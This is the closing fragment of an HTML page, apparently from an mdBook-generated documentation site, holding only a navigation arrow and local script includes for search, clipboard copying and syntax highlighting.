                        <i class="fa fa-angle-right"></i>
                    </a>
            </nav>

        </div>




        <script>
            window.playground_copyable = true;
        </script>


        <script src="../../../elasticlunr.min.js"></script>
        <script src="../../../mark.min.js"></script>
        <script src="../../../searcher.js"></script>

        <script src="../../../clipboard.min.js"></script>
        <script src="../../../highlight.js"></script>
        <script src="../../../book.js"></script>

        <!-- Custom JS scripts -->


    </div>
    </body>
</html>
